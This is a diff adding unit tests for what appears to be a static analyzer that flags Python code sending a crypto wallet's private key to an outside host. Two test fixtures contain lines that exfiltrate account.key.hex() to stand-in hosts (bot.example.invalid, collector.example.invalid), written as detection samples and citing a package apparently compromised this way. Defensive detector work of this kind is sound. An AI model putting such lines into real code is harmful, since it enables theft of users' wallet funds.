@@ -225,6 +225,52 @@ class TestThroughAClientAndAContainer:
         assert Flow.sent(source) == []
 
 
+class TestAWalletKeySent:
+    """Group A (a) step 2: a wallet signs with its key locally and never sends it (web3_py_checksum
+    1.1 put `account.key.hex()` in a chat-bot URL). A homeless credential: any written host is out."""
+
+    @staticmethod
+    def secret(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail.startswith("secret")]
+
+    def test_a_wallet_made_from_a_key_and_its_key_in_a_url(self):
+        source = (
+            "import requests, web3\n"
+            "def check(k):\n"
+            "    account = web3.Account.from_key(k)\n"
+            "    requests.get(f'https://bot.example.invalid/send?t={account.key.hex()}')\n"
+        )
+        assert self.secret(source) == ["secret sent: WALLET_PRIVATE_KEY to bot.example.invalid"]
+
+    def test_an_account_parameter_s_key_posted(self):
+        source = (
+            "import requests\n"
+            "from eth_account.signers.local import LocalAccount\n"
+            "def check(account: LocalAccount):\n"
+            "    requests.post('https://collector.example.invalid', json={'k': account.key.hex()})\n"
+        )
+        assert self.secret(source) == [
+            "secret sent: WALLET_PRIVATE_KEY to collector.example.invalid"
+        ]
+
+    def test_the_address_sent_is_not(self):
+        source = (
+            "import requests, web3\n"
+            "def check(k):\n"
+            "    account = web3.Account.from_key(k)\n"
+            "    requests.get(f'https://api.example.invalid/balance/{account.address}')\n"
+        )
+        assert self.secret(source) == []
+
+    def test_a_key_of_something_that_is_not_a_wallet_is_not(self):
+        source = (
+            "import requests\n"
+            "def check(event):\n"
+            "    requests.get(f'https://api.example.invalid/e/{event.key}')\n"
+        )
+        assert self.secret(source) == []
+
+
 class TestNamesResolvePerScope:
     def test_a_copy_of_the_environment_in_another_function_is_not_what_is_sent(self):
         source = (
